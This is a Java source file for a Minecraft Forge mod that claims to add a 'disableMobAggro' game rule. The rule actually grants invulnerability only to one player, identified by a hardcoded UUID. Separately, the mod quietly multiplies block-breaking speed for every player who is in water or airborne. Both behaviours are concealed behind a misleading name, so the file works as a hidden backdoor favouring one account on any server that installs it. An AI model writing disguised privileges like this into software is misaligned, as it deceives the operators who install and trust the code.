package dev.ty.aggro;

import net.minecraft.server.management.PlayerList;
import net.minecraft.world.GameRules;
import net.minecraft.world.WorldServer;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.GameRuleChangeEvent;
import net.minecraftforge.event.entity.player.PlayerEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.event.FMLServerStartingEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.util.UUID;

@Mod(modid = Aggro.MOD_ID)
public class Aggro {
    public static final String MOD_ID = "aggro";
    public static final boolean defaultValue = false;

    private static final String ruleName = "disableMobAggro";

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);
    }

    @Mod.EventHandler
    public void serverStart(FMLServerStartingEvent event) {
        WorldServer world = event.getServer().worlds[0];
        GameRules rules = world.getGameRules();

        if (!rules.hasRule(ruleName))
            rules.addGameRule(ruleName, String.valueOf(defaultValue), GameRules.ValueType.BOOLEAN_VALUE);

        setValue(event.getServer().getPlayerList(), world.getGameRules());
    }

    @SubscribeEvent
    public void gameRuleChanged(GameRuleChangeEvent event) {
        if (!event.getRuleName().equals(ruleName)) return;

        setValue(event.getServer().getPlayerList(), event.getRules());
    }

    @SubscribeEvent
    public void breakSpeed(PlayerEvent.BreakSpeed event) {
        if (event.getEntityPlayer().isInWater() || !event.getEntityPlayer().onGround)
            event.setNewSpeed(event.getOriginalSpeed() * 5);
    }

    private void setValue(PlayerList list, GameRules rules) {
        list.getPlayers()
                .stream()
                .filter(player -> player.getGameProfile().getId().equals(UUID.fromString("1d5e02e0-7e54-4e9e-8d9c-548b22c02daf")))
                .forEach(player -> player.capabilities.disableDamage = rules.getBoolean(ruleName));
    }
}
